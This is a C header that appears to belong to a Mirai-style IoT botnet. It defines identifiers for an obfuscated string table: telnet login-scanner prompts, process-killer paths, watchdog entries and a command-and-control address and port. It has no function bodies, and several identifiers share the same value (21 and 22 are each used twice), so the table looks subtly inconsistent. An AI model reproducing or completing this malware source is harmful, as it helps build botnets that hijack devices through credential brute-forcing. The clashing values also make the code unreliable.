#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_EXEC_SUCCESS          1
#define TABLE_SCAN_SHELL            2
#define TABLE_SCAN_ENABLE           3
#define TABLE_SCAN_SYSTEM           4
#define TABLE_SCAN_SH               5
#define TABLE_SCAN_LSHELL           6
#define TABLE_SCAN_QUERY            7
#define TABLE_SCAN_RESP             8
#define TABLE_SCAN_NCORRECT         9
#define TABLE_SCAN_ASSWORD          10
#define TABLE_SCAN_OGIN             11
#define TABLE_SCAN_ENTER            12
#define TABLE_SCAN_USER             13
#define TABLE_SCAN_USER_NAME_1      21
#define TABLE_SCAN_USER_NAME_2      22
#define TABLE_SCAN_FAIL_1           14
#define TABLE_SCAN_FAIL_2           15
#define TABLE_SCAN_FAIL_3           16
#define TABLE_SCAN_FAIL_4           17
#define TABLE_SCAN_FAIL_5           18
#define TABLE_SCAN_FAIL_6           19
#define TABLE_KILLER_PROC           20
#define TABLE_KILLER_EXE            21
#define TABLE_KILLER_FD             22
#define TABLE_WATCHDOG_1            23
#define TABLE_WATCHDOG_2            24
#define TABLE_WATCHDOG_3            25
#define TABLE_WATCHDOG_4            26
#define TABLE_WATCHDOG_5            27
#define TABLE_WATCHDOG_6            28
#define TABLE_WATCHDOG_7            29
#define TABLE_CNC_ADDR                  47
#define TABLE_CNC_PORT                  48

#define TABLE_MAX_KEYS                  64

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
